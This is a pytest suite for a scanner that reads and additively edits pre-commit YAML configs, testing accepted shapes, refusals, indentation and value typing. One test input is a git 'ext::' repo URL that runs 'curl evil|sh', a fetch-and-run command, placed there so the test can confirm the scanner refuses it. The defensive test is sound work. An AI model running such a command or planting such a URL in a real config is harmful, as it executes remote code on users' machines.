"""The scanner and the additive writer.

These are the two halves of the ruamel replacement, and the reason it is an
improvement rather than a compromise: the scanner refuses what it cannot prove
it understands, and the writer cannot touch a byte outside the blocks it adds.
"""

from __future__ import annotations

import pytest

import config as C

# -- shapes that must be READ correctly --------------------------------------

INDENTED = """\
minimum_pre_commit_version: "4.0.0"
repos:
  - repo: https://github.com/psf/black
    rev: 24.1.0
    hooks:
      - id: black
        args: [--line-length, "100"]
      - id: black-jupyter
"""

SAME_COLUMN = """\
repos:
- repo: https://github.com/psf/black
  rev: 24.1.0
  hooks:
  - id: black
- repo: local
  hooks:
  - id: mine
    name: mine
    entry: ./x.sh
    language: script
"""

OTHER_TOP_KEYS = """\
ci:
  autofix_prs: true
  skip: [mermaid-lint]
default_language_version:
  python: python3.11
exclude: '^vendor/'
repos:
  - repo: https://github.com/pre-commit/pre-commit-hooks
    rev: v6.0.0
    hooks:
      - id: trailing-whitespace
"""


def test_reads_the_indented_style():
    cfg = C.scan(INDENTED)
    assert [e.url for e in cfg.repos] == ["https://github.com/psf/black"]
    entry = cfg.repos[0]
    assert entry.rev == "24.1.0"
    assert [h.id for h in entry.hooks] == ["black", "black-jupyter"]
    assert entry.item_indent == 2
    assert entry.hook_item_indent == 6


def test_reads_a_sequence_at_the_same_column_as_its_key():
    """`repos:` with items at column 0 is valid YAML and very common.

    Pins the defect where the scanner required indent > 0 and refused this
    whole style as "unexpected indentation at the top level".
    """
    cfg = C.scan(SAME_COLUMN)
    assert [e.url for e in cfg.repos] == ["https://github.com/psf/black", "local"]
    assert cfg.repos_seq_indent == 0
    assert cfg.repos[0].hook_item_indent == 2
    assert cfg.local_hook_ids() == {"mine"}


def test_skips_top_level_keys_it_has_no_interest_in():
    """`ci:` and `default_language_version:` are ordinary; refusing them would
    reject a large share of real configs."""
    cfg = C.scan(OTHER_TOP_KEYS)
    assert set(cfg.top_keys) == {"ci", "default_language_version", "exclude", "repos"}
    assert [e.url for e in cfg.repos] == ["https://github.com/pre-commit/pre-commit-hooks"]


def test_a_colon_inside_a_quoted_scalar_is_data():
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: x\n        files: '\\.ya?ml:$'\n"
    )
    assert [h.id for h in cfg.repos[0].hooks] == ["x"]


def test_a_trailing_comment_is_not_part_of_a_rev():
    cfg = C.scan(
        "repos:\n  - repo: https://x/y\n    rev: v1.2.3  # pinned deliberately\n"
        "    hooks:\n      - id: a\n"
    )
    assert cfg.repos[0].rev == "v1.2.3"


# -- shapes that must be REFUSED ---------------------------------------------


@pytest.mark.parametrize(
    ("name", "text"),
    [
        ("anchor", "repos:\n  - &base\n    repo: https://x/y\n"),
        ("alias", "repos:\n  - repo: https://x/y\n    hooks: *common\n"),
        ("merge key", "d: &d\n  rev: v1\nrepos:\n  - <<: *d\n    repo: https://x/y\n"),
        ("second document", "repos: []\n---\nrepos: []\n"),
        ("document end", "repos: []\n...\n"),
        ("flow repos", "repos: [{repo: local}]\n"),
        ("flow hooks", "repos:\n  - repo: https://x/y\n    hooks: [{id: a}]\n"),
        ("flow entry", "repos:\n  - {repo: local}\n"),
        ("tab indent", "repos:\n\t- repo: https://x/y\n"),
        ("no repos key", "exclude: 'x'\n"),
        ("duplicate top key", "exclude: 'a'\nexclude: 'b'\nrepos: []\n"),
        ("NUL byte", "repos: []\n\x00\n"),
        ("indented top level", "  repos: []\n"),
        ("top-level line with no colon", "just some prose\n"),
    ],
)
def test_refuses_what_it_cannot_prove_it_understands(name, text):
    with pytest.raises(C.ConfigRefused):
        C.scan(text)


@pytest.mark.parametrize(
    ("name", "text"),
    [
        ("stray line in repos block", "repos:\n  - repo: https://x/y\n  oops\n"),
        ("bare dash", "repos:\n  -\n"),
        ("entry not starting with repo", "repos:\n  - rev: v1\n    repo: https://x/y\n"),
        ("unexpected first key", "repos:\n  - name: mine\n    repo: https://x/y\n"),
        ("repo twice", "repos:\n  - repo: https://x/y\n    repo: https://a/b\n"),
        ("hooks as a scalar", "repos:\n  - repo: https://x/y\n    hooks: nope\n"),
        ("hook in flow style", "repos:\n  - repo: local\n    hooks:\n      - {id: a}\n"),
        ("hook without id", "repos:\n  - repo: local\n    hooks:\n      - name: a\n"),
        ("folded repo url", "repos:\n  - repo: https://github.com/psf/\n      black\n"),
        ("block scalar rev", "repos:\n  - repo: https://x/y\n    rev: |\n      v1\n"),
        ("folded hook id", "repos:\n  - repo: local\n    hooks:\n      - id: my\n          hook\n"),
        # Distinct from "unexpected first key": with no colon at all, _split_key
        # returns None and a different branch raises.
        ("repo entry first line has no colon", "repos:\n  - just text\n"),
        (
            "hook item first line has no colon",
            "repos:\n  - repo: local\n    hooks:\n      - just text\n",
        ),
    ],
)
def test_refuses_inside_an_opened_entry_too(name, text):
    """An untested refusal branch is an untested piece of the spec -- and a
    regression that downgrades one to a guess corrupts the user's config."""
    with pytest.raises(C.ConfigRefused):
        C.scan(text)


def test_a_wrapped_url_is_refused_rather_than_truncated():
    """Truncation is worse than refusal: a shortened url compares against the
    wrong thing, so `already present` misses and a duplicate entry is added."""
    with pytest.raises(C.ConfigRefused, match="continues onto the next line"):
        C.scan("repos:\n  - repo: https://github.com/psf/\n      black\n    rev: v1\n")


def test_a_leading_document_marker_is_fine():
    """One `---` opens the only document; only a second one is ambiguous."""
    cfg = C.scan("---\nrepos:\n  - repo: local\n    hooks:\n      - id: a\n")
    assert [e.url for e in cfg.repos] == ["local"]


@pytest.mark.parametrize(
    "line",
    [
        "    entry: bash -c 'a && b'",
        "    args: [--fix, --glob, '*.md']",
        "    exclude: '^(a|b)*$'",
        "    entry: node scripts/lint-mermaid.mjs",
        "    files: '\\.(md|markdown)$'",
    ],
)
def test_the_anchor_guard_does_not_fire_on_ordinary_lines(line):
    """`&&` in a shell entry and `*` in a glob are not YAML anchors.

    A false positive here refuses a perfectly ordinary config, which is a worse
    failure than the one the guard exists to prevent.
    """
    assert C._ANCHOR.search(line) is None


# -- the additive guarantee --------------------------------------------------


def test_verify_additive_accepts_a_real_multi_block_insert():
    """Pins the offset defect: verify_additive added a running offset while
    reconstructing, which mis-sliced every insertion after the first and
    reported a clean additive merge as a clobber."""
    original = [f"line{i}" for i in range(12)]
    insertions = [
        C.Insertion(at=3, block=["added-a"], what="a"),
        C.Insertion(at=12, block=["added-b1", "added-b2"], what="b"),
    ]
    result = C.apply_insertions(original, insertions)
    assert len(result) == len(original) + 3
    C.verify_additive(original, result, insertions)  # must not raise


def test_verify_additive_catches_a_changed_line():
    original = ["a", "b", "c"]
    insertions = [C.Insertion(at=1, block=["new"], what="x")]
    result = C.apply_insertions(original, insertions)
    result[2] = "b-TAMPERED"
    with pytest.raises(C.ConfigRefused, match="outside the blocks"):
        C.verify_additive(original, result, insertions)


def test_verify_additive_rejects_two_blocks_at_one_position():
    """The splice cannot preserve their order, so it must not be attempted."""
    original = ["a", "b"]
    insertions = [
        C.Insertion(at=1, block=["x"], what="x"),
        C.Insertion(at=1, block=["y"], what="y"),
    ]
    with pytest.raises(C.ConfigRefused, match="same line"):
        C.verify_additive(original, C.apply_insertions(original, insertions), insertions)


def test_apply_insertions_keeps_untouched_lines_byte_identical():
    original = ["# comment", "exclude: '^x/'", "", "repos:", "- repo: local"]
    insertions = [C.Insertion(at=3, block=['minimum_pre_commit_version: "4.0.0"'], what="m")]
    result = C.apply_insertions(original, insertions)
    assert result[:3] == original[:3]
    assert result[4:] == original[3:]


# -- indentation -------------------------------------------------------------


def test_hook_delta_reads_the_files_convention():
    indented = C.scan(INDENTED)
    same = C.scan(SAME_COLUMN)
    assert C.observed_hook_delta(indented) == 2  # hooks indented under their key
    assert C.observed_hook_delta(same) == 0  # hooks at the key's own column


def test_render_entry_adopts_the_targets_convention():
    """Writing indented hooks into a file that does not indent them produces a
    config the skill's own yamllint hook rejects under
    `indent-sequences: consistent`."""
    fragment = "- repo: https://x/y\n  rev: v1\n  hooks:\n    - id: a\n      args: [--x]\n"
    entry = C.scan("repos:\n" + fragment).repos[0]

    flat = C.render_entry(fragment, entry, seq_indent=0, want_hook_delta=0)
    assert flat == ["- repo: https://x/y", "  rev: v1", "  hooks:", "  - id: a", "    args: [--x]"]

    nested = C.render_entry(fragment, entry, seq_indent=2, want_hook_delta=2)
    assert nested[0] == "  - repo: https://x/y"
    assert nested[3] == "      - id: a"


def test_reindent_leaves_blank_lines_empty():
    assert C.reindent("a\n\nb", 2) == "  a\n\n  b"


def test_an_inline_comment_with_emphasis_is_not_an_anchor():
    """`# skip *generated* files` is prose, not a YAML alias.

    The anchor guard runs over the whole file before any structural parsing, so
    a false positive here refuses an ordinary config the tool exists to extend.
    """
    cfg = C.scan(
        "exclude: 'vendor/'  # skip *generated* files\n"
        "repos:\n  - repo: https://x/y\n    rev: v1\n    hooks:\n      - id: a\n"
    )
    assert [e.url for e in cfg.repos] == ["https://x/y"]


def test_a_real_alias_after_a_comment_is_still_refused():
    """Stripping comments must not also blind the guard to real aliases."""
    with pytest.raises(C.ConfigRefused, match="anchor or alias"):
        C.scan("repos:\n  - repo: https://x/y  # note\n    hooks: *common\n")


def test_scan_reports_an_empty_flow_list():
    cfg = C.scan('minimum_pre_commit_version: "4.0.0"\nrepos: []\n')
    assert cfg.empty_repos is True
    assert cfg.repos == []


def test_repos_with_a_trailing_comment_is_a_block_sequence():
    """`repos: # note` has an empty value. Without stripping the comment the
    value read as "# note", which the block-sequence check refused -- rejecting
    an ordinary file this tool exists to extend."""
    cfg = C.scan("repos:  # the hooks we run\n  - repo: local\n    hooks:\n      - id: a\n")
    assert [e.url for e in cfg.repos] == ["local"]
    assert cfg.empty_repos is False


def test_hooks_with_a_trailing_comment_is_a_block_sequence():
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:  # two of them\n      - id: a\n      - id: b\n"
    )
    assert [h.id for h in cfg.repos[0].hooks] == ["a", "b"]


def test_a_quoted_hash_is_still_part_of_the_value():
    """Stripping comments must not eat a # that is inside quotes."""
    cfg = C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n        files: '#tagged'\n")
    assert [h.id for h in cfg.repos[0].hooks] == ["a"]


def test_a_crlf_config_records_its_terminator():
    cfg = C.scan("repos:\r\n  - repo: local\r\n    hooks:\r\n      - id: a\r\n")
    assert cfg.newline == "\r\n"
    assert cfg.ends_with_newline is True
    assert [e.url for e in cfg.repos] == ["local"]


def test_a_config_with_no_trailing_newline_records_that():
    cfg = C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a")
    assert cfg.ends_with_newline is False


@pytest.mark.parametrize(
    "codepoint",
    [0x0B, 0x0C, 0x1C, 0x1D, 0x1E, 0x85, 0x2028, 0x2029],
    ids=["VT", "FF", "FS", "GS", "RS", "NEL", "LS", "PS"],
)
def test_refuses_a_line_break_that_is_not_a_newline(codepoint):
    """str.splitlines() breaks on all of these and DISCARDS the character, so
    rejoining materialises a plain newline where it used to be -- a silent
    content change that verify_additive cannot see, because its baseline is
    already the corrupted line list."""
    text = "repos:\n  - repo: local" + chr(codepoint) + "\n    hooks:\n      - id: a\n"
    with pytest.raises(C.ConfigRefused, match="line-breaking character"):
        C.scan(text)


def test_an_ordinary_config_still_scans():
    """The guard above must not fire on \n or \r\n."""
    assert C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n").repos
    assert C.scan("repos:\r\n  - repo: local\r\n    hooks:\r\n      - id: a\r\n").repos


def test_a_folded_continuation_that_looks_like_nesting_is_still_refused():
    """repo:/rev:/id: always carry an inline scalar, so nothing can nest under
    them -- a deeper following line is a continuation whatever it looks like.
    Exempting one that parsed as `key: value` let the truncation this guard
    exists to prevent straight through."""
    with pytest.raises(C.ConfigRefused, match="continues onto the next line"):
        C.scan("repos:\n  - repo: https://x/foo\n      note: something\n")


def test_a_folded_continuation_shaped_like_a_sequence_item_is_refused():
    with pytest.raises(C.ConfigRefused, match="continues onto the next line"):
        C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n          - b\n")


def test_an_empty_block_form_repos_key_scans():
    """Distinct from `repos: []`: a block-form key with no items at all. Never
    constructed by a fixture, but it feeds plan()'s fallback indents."""
    cfg = C.scan("repos:\n")
    assert cfg.repos == []
    assert cfg.repos_seq_indent is None
    assert cfg.repos_end is None
    assert cfg.empty_repos is False


def test_a_repos_key_followed_by_another_top_key_scans():
    cfg = C.scan("repos:\nexclude: 'x'\n")
    assert cfg.repos == []
    assert set(cfg.top_keys) == {"repos", "exclude"}


# -- guards added after round 11 of the reviewer panel ------------------------


def test_a_gating_key_written_as_a_block_list_is_captured():
    """The everyday form. Reading only the inline scalar left settings["stages"]
    as "", which every caller then treats as "not set" -- so a hook confined to
    the manual stage was reported as active coverage."""
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n"
        "        stages:\n          - manual\n          - push\n"
    )
    assert cfg.repos[0].hooks[0].settings["stages"] == "[manual, push]"


def test_the_flow_form_of_a_gating_key_still_works():
    cfg = C.scan("repos:\n  - repo: local\n    hooks:\n      - id: a\n        stages: [manual]\n")
    assert cfg.repos[0].hooks[0].settings["stages"] == "[manual]"


def test_a_hash_without_preceding_whitespace_is_part_of_the_value():
    """YAML opens a comment only at an unquoted # preceded by whitespace.
    Cutting at any # truncated ordinary values silently -- the outcome this
    module says is worse than a refusal."""
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: check-todo#123\n"
        "        exclude: vendor/.*#generated$\n"
    )
    hook = cfg.repos[0].hooks[0]
    assert hook.id == "check-todo#123"
    assert hook.settings["exclude"] == "vendor/.*#generated$"


def test_a_real_trailing_comment_is_still_dropped():
    cfg = C.scan("repos:\n  - repo: local  # the local block\n    hooks:\n      - id: a\n")
    assert cfg.repos[0].url == "local"


# -- guards added after round 12 of the reviewer panel ------------------------


def test_a_doubled_quote_inside_a_single_quoted_scalar_is_not_a_close():
    """`'foo''bar'` is YAML for foo'bar. Treating every quote as a close read
    it as `foo` -- a silent truncation, in a module whose stated rule is that a
    refusal beats a wrong answer that looks right."""
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n        exclude: 'foo''bar'\n"
    )
    assert cfg.repos[0].hooks[0].settings["exclude"] == "foo'bar"


def test_a_backslash_escaped_quote_inside_a_double_quoted_scalar_is_not_a_close():
    cfg = C.scan(
        'repos:\n  - repo: local\n    hooks:\n      - id: a\n        exclude: "foo\\"bar"\n'
    )
    assert "bar" in cfg.repos[0].hooks[0].settings["exclude"]


def test_a_hash_inside_a_quoted_scalar_is_not_a_comment():
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n        exclude: 'vendor/ #keep'\n"
    )
    assert cfg.repos[0].hooks[0].settings["exclude"] == "vendor/ #keep"


def test_an_unterminated_quote_is_refused_not_guessed_at():
    with pytest.raises(C.ConfigRefused, match="never closed"):
        C.scan("repos:\n  - repo: 'local\n    hooks:\n      - id: a\n")


# -- guards added after round 13 of the reviewer panel ------------------------


@pytest.mark.parametrize(
    "url",
    ["ext::sh -c 'curl evil|sh'", "fd::7", "helper::whatever"],
    ids=["ext", "fd", "arbitrary-helper"],
)
def test_a_transport_helper_repo_is_refused(url):
    """This tool hardens its own git calls, but Step 4 runs the separate
    pre-commit binary, which clones every repo: entry with its own ambient git
    config. Such a URL names a program git runs when it does."""
    with pytest.raises(C.ConfigRefused, match="transport helper"):
        C.scan(f"repos:\n  - repo: {url}\n    hooks:\n      - id: a\n")


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/psf/black",
        "git@github.com:psf/black.git",
        "ssh://git@example.invalid/x.git",
        "local",
        "meta",
        "/srv/mirrors/hooks.git",
        "../sibling-repo",
    ],
)
def test_an_ordinary_repo_value_is_accepted(url):
    """An ordinary filesystem path is fine -- people do use them. Only the
    run-a-program shape is refused."""
    cfg = C.scan(f"repos:\n  - repo: {url}\n    hooks:\n      - id: a\n")
    assert cfg.repos[0].url == url


# -- round 15 ----------------------------------------------------------------


def _hook_settings(text: str) -> dict:
    return C.scan(text).repos[0].hooks[0].settings


def test_a_block_sequence_at_its_key_s_own_column_is_read():
    """YAML permits it, and this scanner already supports the style for repos:
    and hooks:. Reading it as "" made looks_disabled() treat a manual-only hook
    as active coverage -- the exact false-coverage failure the feature exists to
    prevent, reintroduced by an indentation style."""
    same_column = (
        "repos:\n"
        "  - repo: https://github.com/gitleaks/gitleaks\n"
        "    rev: v8.0.0\n"
        "    hooks:\n"
        "      - id: gitleaks\n"
        "        stages:\n"
        "        - manual\n"
    )
    assert _hook_settings(same_column)["stages"] == "[manual]"


def test_the_indented_block_sequence_style_still_reads():
    indented = (
        "repos:\n"
        "  - repo: https://github.com/gitleaks/gitleaks\n"
        "    rev: v8.0.0\n"
        "    hooks:\n"
        "      - id: gitleaks\n"
        "        stages:\n"
        "          - manual\n"
        "          - push\n"
    )
    assert _hook_settings(indented)["stages"] == "[manual, push]"


def test_a_sibling_key_at_the_same_column_ends_the_sequence():
    text = (
        "repos:\n"
        "  - repo: https://github.com/gitleaks/gitleaks\n"
        "    rev: v8.0.0\n"
        "    hooks:\n"
        "      - id: gitleaks\n"
        "        stages:\n"
        "        - manual\n"
        "        files: '\\.py$'\n"
    )
    settings = _hook_settings(text)
    assert settings["stages"] == "[manual]"
    assert settings["files"] == "\\.py$"  # _scalar strips the quotes


def test_ragged_sequence_items_are_not_read_as_one_sequence():
    """Refusing to guess is this scanner's posture everywhere else."""
    text = (
        "repos:\n"
        "  - repo: https://github.com/gitleaks/gitleaks\n"
        "    rev: v8.0.0\n"
        "    hooks:\n"
        "      - id: gitleaks\n"
        "        stages:\n"
        "        - manual\n"
        "          - push\n"
    )
    assert _hook_settings(text)["stages"] == "[manual]"


def test_an_escape_yaml_does_not_define_refuses_the_config():
    """`files: "\\.md$"` is a regex written as if the quotes were single. YAML
    has no `\\.` escape and pre-commit's loader stops there ("found unknown
    escape character"), so the file loads no hook at all. Left as written it
    compiled as the regex its author meant, and a hook in a config that runs
    nothing read as live -- and stood in for the working alternative."""
    hook = 'repos:\n  - repo: local\n    hooks:\n      - id: a\n        files: "\\.md$"\n'
    with pytest.raises(C.ConfigRefused, match=r"backslash before '\.'.*line 5"):
        C.scan(hook)
    # At the top level the same value came back as "not set", and every hook
    # was judged as if the config-wide filter had never been written.
    with pytest.raises(C.ConfigRefused, match=r"backslash before '\.'.*line 1"):
        C.scan('files: "\\.md$"\nrepos: []\n')
    # Inside a flow item the whole `[...]` passed the scan and the item was
    # only read when the stages were asked for -- where the refusal surfaced
    # as a traceback. It is read at scan time now, at either level.
    with pytest.raises(C.ConfigRefused, match=r"backslash before '-'.*line 5"):
        C.scan(
            'repos:\n  - repo: local\n    hooks:\n      - id: a\n        stages: ["pre\\-commit"]\n'
        )
    with pytest.raises(C.ConfigRefused, match=r"never closed.*line 5"):
        C.scan(
            'repos:\n  - repo: local\n    hooks:\n      - id: a\n        stages: ["pre-commit]\n'
        )
    with pytest.raises(C.ConfigRefused, match=r"never closed.*line 1"):
        C.scan('default_stages: ["pre-commit]\nrepos: []\n')
    # A `\\U` escape naming a code point past the last one there is.
    with pytest.raises(C.ConfigRefused, match="past the last Unicode code point"):
        C.scan('repos:\n  - repo: local\n    hooks:\n      - id: a\n        files: "\\U00110000"\n')


def test_a_hash_inside_a_quoted_flow_item_is_not_a_comment():
    """`stages: [commit, "x #y"]`: the `#` sits inside quotes. The plain-scalar
    comment cut did not know that and left `[commit, "x`, whose never-closed
    quote then refused a valid config -- as a traceback, when the stages were
    read."""
    cfg = C.scan(
        'repos:\n  - repo: local\n    hooks:\n      - id: a\n        stages: [commit, "x #y"]\n'
    )
    assert C.flow_items(cfg.repos[0].hooks[0].settings["stages"]) == ["commit", "x #y"]


def test_a_plain_value_yaml_would_not_read_as_text_refuses_the_config():
    """`files: null` is None to YAML, `files: 123` a number, `files:` with
    nothing after it null again, and `files: [.]md$` a flow sequence YAML does
    not parse at all. pre-commit wants text at every one of these and rejects
    the file; read as the text `null`, the value was a live pattern, one
    reaching `null.md`. Quoted, or tagged `!!str`, the same characters are
    text; a value that only looks like a number to a person is text to YAML;
    and the booleans are booleans where pre-commit wants one."""
    head = "repos:\n  - repo: local\n    hooks:\n      - id: a\n"
    for value in (
        "null",
        "~",
        "",
        "true",
        "Yes",
        "123",
        "0x1F",
        "1.5",
        "2024-01-02",
        "<<",
        "[.]md$",
    ):
        with pytest.raises(C.ConfigRefused, match="line 5"):
            C.scan(head + f"        files: {value}\n")
    with pytest.raises(C.ConfigRefused, match=r"not text.*line 1"):
        C.scan("exclude: 123\nrepos: []\n")
    # A tag only settles what a SCALAR is: `!!str [README]` is a string tag on
    # a sequence node, which the loader rejects -- on a list key as much.
    with pytest.raises(C.ConfigRefused, match=r"is a collection.*line 5"):
        C.scan(head + "        files: !!str [README]\n")
    for line in ("stages: !!str [manual]", "types: !!str [text]", "always_run: !!bool [true]"):
        with pytest.raises(C.ConfigRefused, match=r"is a collection.*line 5"):
            C.scan(head + f"        {line}\n")
    with pytest.raises(C.ConfigRefused, match=r"is a collection.*line 1"):
        C.scan("default_stages: !!str [manual]\nrepos: []\n")
    # `!!seq` IS the tag for a sequence, flow or block, on a list key; it is no
    # tag for a scalar, and no tag for a text key's value.
    cfg = C.scan(head + "        stages: !!seq [manual]\n        types: !!seq\n          - text\n")
    assert cfg.repos[0].hooks[0].settings == {"stages": "[manual]", "types": "[text]"}
    top = C.scan("default_stages: !!seq [manual]\nrepos: []\n")
    assert C.top_level_sequence(top, "default_stages") == "[manual]"
    top = C.scan("default_stages: !!seq\n  - manual\nrepos: []\n")
    assert C.top_level_sequence(top, "default_stages") == "[manual]"
    with pytest.raises(C.ConfigRefused, match=r"no sequence.*line 5"):
        C.scan(head + "        stages: !!seq manual\n")
    with pytest.raises(C.ConfigRefused, match=r"tag `!!seq`.*line 5"):
        C.scan(head + "        files: !!seq [a]\n")
    with pytest.raises(C.ConfigRefused, match=r"holds a list.*line 5"):
        C.scan(head + "        files:\n          - a\n")
    with pytest.raises(C.ConfigRefused, match=r"holds a list.*line 1"):
        C.scan("exclude:\n  - a\nrepos: []\n")
    for spelled, read in (
        ('"null"', "null"),
        ("'123'", "123"),
        ("!!str null", "null"),
        ("!!str", ""),
    ):
        cfg = C.scan(head + f"        files: {spelled}\n")
        assert cfg.repos[0].hooks[0].settings["files"] == read
    # The tag holds across a continued value too -- the scanner folds first and
    # reads the scalar second, and the tag has to reach the second step.
    cfg = C.scan(head + '        files: !!str "nu\n          ll"\n')
    assert cfg.repos[0].hooks[0].settings["files"] == "nu ll"
    cfg = C.scan("files: !!str\n  123\nrepos: []\n")
    assert C.top_level_scalar(cfg, "files") == "123"
    cfg = C.scan(
        head + "        files: 1.2.3\n        always_run: true\n        pass_filenames: no\n"
    )
    assert cfg.repos[0].hooks[0].settings["files"] == "1.2.3"
    assert cfg.repos[0].hooks[0].settings["always_run"] == "true"
    assert cfg.repos[0].hooks[0].settings["pass_filenames"] == "no"
    # `repo:`, `rev:` and `id:` want text as well.
    with pytest.raises(C.ConfigRefused, match="not text"):
        C.scan("repos:\n  - repo: https://x.invalid/r\n    rev: 1.2\n    hooks:\n      - id: a\n")
    with pytest.raises(C.ConfigRefused, match="not text"):
        C.scan("repos:\n  - repo: local\n    hooks:\n      - id: 123\n")


def test_a_scalar_where_pre_commit_wants_a_list_refuses_the_config():
    """`stages: pre-commit` and `types: text` are scalars where pre-commit's
    schema wants an array, and `stages:` with nothing after it is null; the
    file does not load. Read as one-item lists they judged a hook in a config
    that runs none. The flow and block forms are the lists they are."""
    head = "repos:\n  - repo: local\n    hooks:\n      - id: a\n"
    for line in (
        "stages: pre-commit",
        "types: text",
        "exclude_types: markdown",
        "stages:",
        'types: "[file, text]"',
        "stages: '[manual]'",
        "stages: !!str [manual]x",
    ):
        with pytest.raises(C.ConfigRefused, match=r"line 5"):
            C.scan(head + f"        {line}\n")
    with pytest.raises(C.ConfigRefused, match=r"wants a list.*line 1"):
        C.scan('default_stages: "[manual]"\nrepos: []\n')
    with pytest.raises(C.ConfigRefused, match=r"wants a list.*line 1"):
        C.scan("default_stages: manual\nrepos: []\n")
    with pytest.raises(C.ConfigRefused, match=r"holds nothing.*line 1"):
        C.scan("default_stages:\nrepos: []\n")
    cfg = C.scan(head + "        stages: [manual]\n        types:\n          - text\n")
    assert cfg.repos[0].hooks[0].settings == {"stages": "[manual]", "types": "[text]"}


def test_a_plain_value_yaml_cannot_start_refuses_the_config():
    """`@`, a backquote and `%` cannot start a plain scalar, nor can a flow
    indicator or a `-`, `?` or `:` followed by white space: the loader stops
    ("cannot start any token") and the file does not load. Returned as the
    regex `@README`, it matched `@README.md` and a hook read as live in a
    config that runs none. Quoted, the same characters are text. An item of a
    gating list is text too: `123` is a number pre-commit rejects where it
    wants a stage name, and `~` is null."""
    head = "repos:\n  - repo: local\n    hooks:\n      - id: a\n"
    for value in ("@README", "`x`", "%x", ",x", "]x", "}x", "- x", "? x", ": x", "-"):
        with pytest.raises(C.ConfigRefused, match=r"cannot start.*line 5"):
            C.scan(head + f"        files: {value}\n")
    cfg = C.scan(head + "        files: '@README'\n        stages: [manual, '- x']\n")
    assert cfg.repos[0].hooks[0].settings["files"] == "@README"
    assert C.flow_items(cfg.repos[0].hooks[0].settings["stages"]) == ["manual", "- x"]
    for value in ("[pre-commit, 123]", "[manual, ~]", "[@x]"):
        with pytest.raises(C.ConfigRefused, match="line 5"):
            C.scan(head + f"        stages: {value}\n")
    with pytest.raises(C.ConfigRefused, match=r"not text.*line 1"):
        C.scan("default_stages:\n  - manual\n  - 123\nrepos: []\n")


def test_a_non_boolean_where_pre_commit_wants_one_refuses_the_config():
    """`always_run` and `pass_filenames` are booleans in pre-commit's schema:
    `"true"` in quotes is a string, `maybe` a word, `!!str yes` a string again,
    and nothing after the colon is null. pre-commit rejects each, and the file
    does not load; read as its spelling, the value was then compared as though
    it were the boolean it is not. Every plain YAML 1.1 spelling is one."""
    head = "repos:\n  - repo: local\n    hooks:\n      - id: a\n"
    for line in (
        'pass_filenames: "true"',
        "always_run: maybe",
        "always_run: !!str yes",
        "always_run:",
        "always_run: 1",
    ):
        with pytest.raises(C.ConfigRefused, match=r"wants a boolean.*line 5"):
            C.scan(head + f"        {line}\n")
    # A list under a boolean key is refused too -- at the item, since a list's
    # items are read as text and `true` is not, before the shape is even asked.
    with pytest.raises(C.ConfigRefused, match=r"line 5"):
        C.scan(head + "        always_run:\n          - true\n")
    with pytest.raises(C.ConfigRefused, match=r"holds a list, where pre-commit wants a boolean"):
        C.scan(head + "        always_run:\n          - x\n")
    for spelling in ("true", "False", "yes", "NO", "on", "Off", "!!bool true"):
        cfg = C.scan(head + f"        always_run: {spelling}\n        pass_filenames: {spelling}\n")
        assert cfg.repos[0].hooks[0].settings["always_run"] == spelling.removeprefix("!!bool ")
    # `!!bool` is the one tag a boolean may carry, and it does not make a word
    # a boolean; a text key does not take it. Under the tag the spelling may be
    # quoted: the tag overrides the quotes' type, and `!!bool "true"` is True.
    for line in ("always_run: !!bool maybe", 'always_run: !!bool "maybe"'):
        with pytest.raises(C.ConfigRefused, match=r"wants a boolean.*line 5"):
            C.scan(head + f"        {line}\n")
    cfg = C.scan(
        head + "        always_run: !!bool \"true\"\n        pass_filenames: !!bool 'No'\n"
    )
    assert cfg.repos[0].hooks[0].settings == {"always_run": "true", "pass_filenames": "No"}
    with pytest.raises(C.ConfigRefused, match=r"tag `!!bool`.*line 5"):
        C.scan(head + "        files: !!bool true\n")


def test_a_block_list_item_reads_back_whole():
    """A block list is rendered in the flow shape for every reader, and an item
    holding a comma -- `- "file,text,markdown"`, one (unknown) tag to
    pre-commit -- was joined bare and read back as three. Quoted on the way in,
    it is one on the way out, with quotes, brackets and a `#` inside kept."""
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n"
        '        types:\n          - "file,text,markdown"\n          - text\n'
        '        stages:\n          - \'a"b\'\n          - "[c] #d"\n          - " e "\n'
    )
    settings = cfg.repos[0].hooks[0].settings
    assert C.flow_items(settings["types"]) == ["file,text,markdown", "text"]
    assert C.flow_items(settings["stages"]) == ['a"b', "[c] #d", " e "]
    # A line break inside an item -- `"file\\n"` is the tag `file` plus a
    # newline, one pre-commit rejects -- survives the trip as well.
    cfg = C.scan(
        "repos:\n  - repo: local\n    hooks:\n      - id: a\n"
        '        types:\n          - "file\\n"\n          - "a\\tb"\n'
    )
    assert C.flow_items(cfg.repos[0].hooks[0].settings["types"]) == ["file\n", "a\tb"]
    top = C.scan('default_stages:\n  - "pre-commit,manual"\nrepos: []\n')
    assert C.flow_items(C.top_level_sequence(top, "default_stages") or "") == ["pre-commit,manual"]


def test_what_yaml_rejects_around_a_quoted_value_or_inside_a_flow_list_is_refused():
    """`files: "^README[.]md$" junk` and `types: [file,,text]` stop YAML's
    loader; read as the quoted part, or as the shorter list, they judged a hook
    in a config that does not load. A comment after the quote, and the one
    empty entry a trailing comma leaves, are the YAML they are."""
    head = "repos:\n  - repo: local\n    hooks:\n      - id: a\n"
    with pytest.raises(C.ConfigRefused, match=r"`junk` follows a quoted value.*line 5"):
        C.scan(head + '        files: "^README[.]md$" junk\n')
    with pytest.raises(C.ConfigRefused, match=r"follows a quoted value.*line 5"):
        C.scan(head + "        stages: ['manual'x]\n")
    for value in ("[file,,text]", "[, text]", "[,]"):
        with pytest.raises(C.ConfigRefused, match=r"empty entry.*line 5"):
            C.scan(head + f"        types: {value}\n")
    cfg = C.scan(
        head + '        files: "^README[.]md$"   # the one file\n'
        "        types: [text, ]\n        stages: []\n"
    )
    settings = cfg.repos[0].hooks[0].settings
    assert settings["files"] == "^README[.]md$"
    assert C.flow_items(settings["types"]) == ["text"]
    assert C.flow_items(settings["stages"]) == []


